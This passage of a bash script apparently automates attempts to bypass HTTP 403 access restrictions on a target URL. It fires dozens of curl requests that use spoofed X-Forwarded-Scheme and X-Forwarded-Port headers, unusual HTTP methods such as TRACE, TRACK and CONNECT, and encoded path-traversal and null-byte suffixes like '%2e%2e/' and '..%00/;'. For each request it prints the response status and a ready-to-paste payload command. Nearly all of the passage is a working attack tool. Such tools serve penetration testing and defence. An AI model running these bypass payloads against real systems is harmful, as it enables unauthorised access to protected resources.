  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "http://${mainUrl}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -X GET 'http://${mainUrl}/${path}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -X GET "https://${mainUrl}/${path}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -X GET 'https://${mainUrl}/${path}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarded-Scheme: http' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarded-Scheme: https' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarded-Port: 443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarded-Port: 4443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarded-Port: 80' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarded-Port: 8080' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarded-Port: 8443' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X GET)
  
  payload=$(printf "curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X GET")
  fun_print

  code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X POST)
  
  payload=$(printf "curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X POST")
  fun_print

  code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X OPTIONS)
  
  payload=$(printf "curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X OPTIONS")
  fun_print

  code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PUT)
  
  payload=$(printf "curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PUT")
  fun_print

  code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACE)
  
  payload=$(printf "curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACE")
  fun_print

  code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X PATCH)
  
  payload=$(printf "curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X PATCH")
  fun_print

  code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X TRACK)
  
  payload=$(printf "curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X TRACK")
  fun_print

  code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X CONNECT)
  
  payload=$(printf "curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X CONNECT")
  fun_print

  code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X UPDATE)
  
  payload=$(printf "curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X UPDATE")
  fun_print

  code=$(curl -ks "${target}" -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -L -o /dev/null -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -X LOCK)
  
  payload=$(printf "curl -ks '${target}' -L -H 'User-Agent: Mozilla/5.0' -X LOCK")
  fun_print
  
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}#?" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}#?' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%09' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09%3b" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%09%%%%3b' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%09..' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%09;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%09;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%20" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%20' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%23%3f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%23%%%%3f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%252f%252f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%252f%%%%252f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%252f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%252f/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2e%2e/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%2e%%%%2e/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%20%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%2f%%%%20%%%%23' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%2f%%%%23' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%3b%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%2f%%%%3b%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%3b%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%2f%%%%3b%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%3f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%2f%%%%3f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f%3f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%2f%%%%3f/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%2f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%2f/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%3b' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%3b%%%%09' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%2f%2e%2e" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%3b%%%%2f%%%%2e%%%%2e' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%2f%2e%2e%2f%2e%2e%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%3b%%%%2f%%%%2e%%%%2e%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%2f%2e." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%3b%%%%2f%%%%2e.' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b%2f.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%3b%%%%2f..' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b/%2e%2e/..%2f%2f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%3b/%%%%2e%%%%2e/..%%%%2f%%%%2f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b/%2e." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%3b/%%%%2e.' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b/%2f%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%3b/%%%%2f%%%%2f../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b/.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%3b/..' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3b//%2f../" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%3b//%%%%2f../' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3f%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%3f%%%%23' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}%3f%3f" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}%%%%3f%%%%3f' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}.." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%00/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..%%%%00/;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%00;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..%%%%00;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%09" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..%%%%09' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%0d/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..%%%%0d/;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%0d;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..%%%%0d;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%5c/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..%%%%5c/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%ff/;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..%%%%ff/;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..%ff;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..%%%%ff;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;%00/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..;%%%%00/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;%0d/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..;%%%%0d/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;%ff/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..;%%%%ff/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;\\" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..;\\\\\\\' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..;\;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..;\;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}..\;" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}..\;' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%20#" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%20#' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%20%23" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%20%%%%23' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}/%252e%252e%252f/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -k -s '${target}/%%%%252e%%%%252e%%%%252f/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
